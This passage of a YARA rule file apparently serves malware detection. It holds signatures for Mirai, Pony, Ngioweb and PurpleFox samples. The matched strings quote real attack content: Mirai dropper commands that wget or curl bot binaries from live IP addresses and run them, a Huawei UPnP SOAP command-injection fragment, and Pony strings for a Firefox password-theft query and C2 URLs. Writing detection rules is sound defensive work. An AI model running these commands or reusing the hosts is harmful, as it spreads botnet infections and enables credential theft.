      all of them
}

rule Mirai_signature__e1e22f06 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e1e22f06.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e1e22f068dc28f950c02d1bbb6dce7f0b0aff726473d73305a4691fb57235341"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" fullword ascii /* score: '17.00'*/
      $s5 = "kthreadd" fullword ascii /* score: '11.00'*/
      $s6 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
      $s7 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
      $s8 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
      $s9 = "ksoftirqd" fullword ascii /* score: '8.00'*/
      $s10 = "nodiratime" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Pony_signature__728afd0aeb7539a2a721ececf5f36865_imphash_ {
   meta:
      description = "_subset_batch - file Pony(signature)_728afd0aeb7539a2a721ececf5f36865(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ad0298b4303962d0cf5a392ca2c3ad4bd2cd1d857c7a4810a0d1129888773ac"
   strings:
      $s1 = "Opera.HTML\\shell\\open\\command" fullword ascii /* score: '25.00'*/
      $s2 = "^shell32.dll" fullword ascii /* score: '25.00'*/
      $s3 = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins" fullword ascii /* score: '25.00'*/
      $s4 = "http://www.weallscheme.com/wp-content/uploads/2010/07/menu.php" fullword ascii /* score: '24.00'*/
      $s5 = "SMTP Password" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "http://www.evokingyou.com/fashion/wp-content/themes/twentyeleven/inc/external.php" fullword ascii /* score: '22.00'*/
      $s7 = "FtpPassword" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s8 = "http://www.scoopcelebrity.com/mobiledummy/wp-content/plugins/wordpress-seo/admin/linkdex/external.php" fullword ascii /* score: '22.00'*/
      $s9 = "unleap.exe" fullword ascii /* score: '22.00'*/
      $s10 = "aPLib v1.01  -  the smaller the better :)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s11 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)" fullword ascii /* score: '20.00'*/
      $s12 = "ftpshell.fsi" fullword ascii /* score: '20.00'*/
      $s13 = "\\Global Downloader" fullword ascii /* score: '20.00'*/
      $s14 = "Software\\Far\\SavedDialogHistory\\FTPHost" fullword ascii /* score: '19.00'*/
      $s15 = "fireFTPsites.dat" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule Mirai_signature__e7faff63 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e7faff63.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e7faff639b6bb5b31330c71bd319bb5118a5b0ad9d32c9af3286134d239d776c"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.ppc; curl -O http://196.251." ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.arc; curl -O http://196.251." ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.arm; curl -O http://196.251." ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.spc; curl -O http://196.251." ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.arc; curl -O http://196.251." ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.arm; curl -O http://196.251." ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.spc; curl -O http://196.251." ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.ppc; curl -O http://196.251." ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.i686; curl -O http://196.251" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.arm5; curl -O http://196.251" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.arm6; curl -O http://196.251" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.x86; curl -O http://196.251." ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.m68k; curl -O http://196.251" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.mips; curl -O http://196.251" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.85.246/hiddenbin/boatnet.i468; curl -O http://196.251" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__ece6ad2b {
   meta:
      description = "_subset_batch - file Mirai(signature)_ece6ad2b.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ece6ad2bcb9893e4de09c979f602170e374a2f78a31bed66c97544e6d5afe76f"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.arc; curl -O http://178.16.52" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.ppc; curl -O http://178.16.52" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.arm; curl -O http://178.16.52" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.ppc; curl -O http://178.16.52" ascii /* score: '29.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.arm; curl -O http://178.16.52" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.arc; curl -O http://178.16.52" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.i686; curl -O http://178.16.5" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.x86_64; curl -O http://178.16" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.x86; curl -O http://178.16.52" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.armv5l; curl -O http://178.16" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.mips; curl -O http://178.16.5" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.armv6l; curl -O http://178.16" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.powerpc; curl -O http://178.1" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.i486; curl -O http://178.16.5" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.103/hiddenbin/boatnet.armv7l; curl -O http://178.16" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 10KB and
      8 of them
}

rule Mirai_signature__eee4d138 {
   meta:
      description = "_subset_batch - file Mirai(signature)_eee4d138.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eee4d138ff3b49eaab577def8f0452dc980322ed3e64927ac091e28e69730bac"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.ppc; curl -O http://196.251.70.174/b" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.ppc; curl -O http://196.251.70.174/b" ascii /* score: '29.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.arm7; curl -O http://196.251.70.174/" ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.x86; curl -O http://196.251.70.174/b" ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.mips; curl -O http://196.251.70.174/" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.arm6; curl -O http://196.251.70.174/" ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.sh4; curl -O http://196.251.70.174/b" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.arm5; curl -O http://196.251.70.174/" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.arm4; curl -O http://196.251.70.174/" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.mpsl; curl -O http://196.251.70.174/" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.m68k; curl -O http://196.251.70.174/" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.m68k; curl -O http://196.251.70.174/" ascii /* score: '26.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.mpsl; curl -O http://196.251.70.174/" ascii /* score: '26.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.arm6; curl -O http://196.251.70.174/" ascii /* score: '26.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/bins/sora.arm4; curl -O http://196.251.70.174/" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__f7f4c64c {
   meta:
      description = "_subset_batch - file Mirai(signature)_f7f4c64c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f7f4c64cbd688223429dc68c443ba2d55f72a5bca3b0b295691b1b1728ff4769"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.spc; curl -O http://193." ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.arc; curl -O http://193." ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.ppc; curl -O http://193." ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.arm; curl -O http://193." ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.arm; curl -O http://193." ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.x86_64; curl -O http://1" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.arc; curl -O http://193." ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.sh4; curl -O http://193." ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.arm7; curl -O http://193" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.spc; curl -O http://193." ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.mips; curl -O http://193" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.i468; curl -O http://193" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.m68k; curl -O http://193" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.ppc; curl -O http://193." ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.111.248.238/00101010101001/morte.arm6; curl -O http://193" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f866e7e0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f866e7e0.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f866e7e08958f9afc51bd67169a54bc793f32ebae6de0899ab5333e858ba4707"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/sh4; curl -O http://82.27.2.83/bins/sh4;cat s" ascii /* score: '35.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/mpsl; curl -O http://82.27.2.83/bins/mpsl;cat" ascii /* score: '35.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/ppc; curl -O http://82.27.2.83/bins/ppc;cat p" ascii /* score: '35.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/m68k; curl -O http://82.27.2.83/bins/m68k;cat" ascii /* score: '35.00'*/
      $x5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/arm5; curl -O http://82.27.2.83/bins/arm5;cat" ascii /* score: '35.00'*/
      $x6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/x86; curl -O http://82.27.2.83/bins/x86;cat x" ascii /* score: '35.00'*/
      $x7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/mips; curl -O http://82.27.2.83/bins/mips;cat" ascii /* score: '35.00'*/
      $x8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/arm4; curl -O http://82.27.2.83/bins/arm4;cat" ascii /* score: '35.00'*/
      $x9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/arm6; curl -O http://82.27.2.83/bins/arm6;cat" ascii /* score: '35.00'*/
      $x10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/arm7; curl -O http://82.27.2.83/bins/arm7;cat" ascii /* score: '35.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/mpsl; curl -O http://82.27.2.83/bins/mpsl;cat" ascii /* score: '23.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/sh4; curl -O http://82.27.2.83/bins/sh4;cat s" ascii /* score: '23.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/arm6; curl -O http://82.27.2.83/bins/arm6;cat" ascii /* score: '23.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/arm7; curl -O http://82.27.2.83/bins/arm7;cat" ascii /* score: '23.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.27.2.83/bins/arm4; curl -O http://82.27.2.83/bins/arm4;cat" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 4KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f05e032a {
   meta:
      description = "_subset_batch - file Mirai(signature)_f05e032a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f05e032ac51071feade51ab5c77a76050a8ebd2b92f6ce9b6e24798f3fcd981d"
   strings:
      $s1 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
      $s2 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__f1d9d7b7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f1d9d7b7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f1d9d7b7da19c235922eef8b0575a78e1eaf7bca89da6be9e235547ba4a75bc3"
   strings:
      $s1 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s2 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
      $s3 = "netstat" fullword ascii /* score: '8.00'*/
      $s4 = "udevadm" fullword ascii /* score: '8.00'*/
      $s5 = "killall" fullword ascii /* score: '8.00'*/
      $s6 = "iptables" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__e6b0792c {
   meta:
      description = "_subset_batch - file Mirai(signature)_e6b0792c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e6b0792cbfdfb97b7f189281edd66438f20506ad7000ff5f1ea181706072e8fb"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " http://196.251.70.174/bins/mips; /bin/busybox chmod 777 * atp.mips; ./atp.mips huawei)</NewStatusURL><NewDownloadURL>$(echo HUA" ascii /* score: '29.00'*/
      $s3 = "WEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__e2025ce6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e2025ce6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e2025ce62a34019e71c234ae1e11a2da30a2615cc10a854ff9961619ddd6e94d"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f4908568 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4908568.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f4908568c4185d4efb196df8a535464add7c31eaf1a352dd45b756afbfd9a7c1"
   strings:
      $s1 = "[killer] Failed to create child process." fullword ascii /* score: '18.00'*/
      $s2 = "User-Agent: Update v1.0" fullword ascii /* score: '17.00'*/
      $s3 = "Error opening /proc directory" fullword ascii /* score: '11.00'*/
      $s4 = "/bin/systemd" fullword ascii /* score: '10.00'*/
      $s5 = "CondiNet %s:%d" fullword ascii /* score: '9.50'*/
      $s6 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ea16901c {
   meta:
      description = "_subset_batch - file Mirai(signature)_ea16901c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ea16901c097ed4d78b946365ea78b99c2ba936dd73f5ca86d1b0975bed01da1a"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__efba5418 {
   meta:
      description = "_subset_batch - file Mirai(signature)_efba5418.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "efba5418d1b71cb9ac4e0280db8a690e85562a0379d6e957a8923438bd617b3f"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__f5331b74 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f5331b74.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5331b7483b044aa963540ee1f562d4b6ad6bf8103930999147ac7d010580082"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__fb1fbeba {
   meta:
      description = "_subset_batch - file Mirai(signature)_fb1fbeba.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fb1fbeba05fcde7bab968785f33587569707c303bd0fc1e577880d7fe83cf14e"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__f4dad330 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4dad330.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f4dad33078921783670cc232b58625bcaba295c181188aac4b3ee98d3c9c5c74"
   strings:
      $s1 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s2 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e251cf09 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e251cf09.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e251cf0929d3b08d930612491c23caa257e44241bf051ef7b3e13d01b5983df2"
   strings:
      $s1 = "[killer] Failed to create child process." fullword ascii /* score: '18.00'*/
      $s2 = "User-Agent: Update v1.0" fullword ascii /* score: '17.00'*/
      $s3 = "/bin/systemd" fullword ascii /* score: '10.00'*/
      $s4 = "CoondiiNeett %s:%d" fullword ascii /* score: '9.50'*/
      $s5 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Ngioweb_signature__7400b97b {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_7400b97b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7400b97bfecc2f597a629b8f52f7b26d977ecfa8ae031ab198257ebfeabd4e98"
   strings:
      $s1 = "tnam/service/sys/passwd" fullword ascii /* score: '10.00'*/
      $s2 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s3 = "aeiobcdfghklmnprstvx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__e268c47d {
   meta:
      description = "_subset_batch - file Mirai(signature)_e268c47d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e268c47d7b6fdc1871f03e3b9aca8efa96d1292f99b0178f08f5b783f9fa235a"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://139.177.197.168/arm4 ; chmod 777 arm4 ; ./" ascii /* score: '27.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://139.177.197.168/arm6 ; chmod 777 arm6 ; ./" ascii /* score: '27.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://139.177.197.168/arm7 ; chmod 777 arm7 ; ./" ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://139.177.197.168/arm5 ; chmod 777 arm5 ; ./" ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://139.177.197.168/arm4 ; chmod 777 arm4 ; ./" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://139.177.197.168/arm7 ; chmod 777 arm7 ; ./" ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://139.177.197.168/arm6 ; chmod 777 arm6 ; ./" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://139.177.197.168/arm5 ; chmod 777 arm5 ; ./" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__f4d78d33 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4d78d33.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f4d78d33730b1d753d126b0a7e0b27d249408a7ffa04123f755c762d026f5050"
   strings:
      $s1 = "./doc/page/login.asp?_" fullword ascii /* score: '18.00'*/
      $s2 = "srcport" fullword ascii /* score: '11.00'*/
      $s3 = "datarand" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule PurpleFo_signature__323f9a588df3d5a4732f7632ec223efe_imphash_ {
   meta:
      description = "_subset_batch - file PurpleFo(signature)_323f9a588df3d5a4732f7632ec223efe(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "00c1314504b05c7fc7cc7280405f31165b9722c704520afef26aa88ff566b871"
   strings:
      $s1 = "sainbox.exe" fullword ascii /* score: '22.00'*/
      $s2 = "CLedShowDemo.EXE" fullword wide /* score: '22.00'*/
      $s3 = "support@appspeed.com" fullword ascii /* score: '21.00'*/
      $s4 = "http://www.appspeed.com/" fullword ascii /* score: '17.00'*/
      $s5 = "compression type not supported" fullword ascii /* score: '12.00'*/
      $s6 = "ERROR in Combining Region" fullword ascii /* score: '12.00'*/
